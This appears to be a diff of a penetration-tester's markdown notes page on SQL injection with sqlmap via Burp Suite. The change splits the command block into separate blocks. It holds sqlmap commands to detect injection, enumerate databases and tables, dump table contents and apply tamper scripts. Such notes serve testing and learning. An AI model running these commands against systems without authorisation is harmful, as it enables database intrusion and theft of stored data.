@@ -12,31 +12,49 @@ tags: ["sqlmap", "sqli", "sql injection", "burpsuite"]
 ```bash
 # In Burp Suite, we can right click the request and click `copy to file` to save the request
 # And add `*` to request to indicate the sql injection point
+```
 
+```bash
 # Initial testing HTTP
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10
+```
 
+```bash
 # Initial testing HTTPS
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
+```
 
+```bash
 # Add a string to indicate injection succeed (e.g., Invalid User vs Error Occurred)
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
+```
 
+```bash
 # Get databases
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
+```
 
+```bash
 # Get tables
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --tables
+```
 
+```bash
 # Dump table
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME -T TABLE_NAME --dump
+```
 
+```bash
 # Dump all tables (slow)
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --dump
+```
 
+```bash
 # Add payload tamper script, e.g., randomcase
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
+```
 
+```bash
 # Specify technique
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
 ```
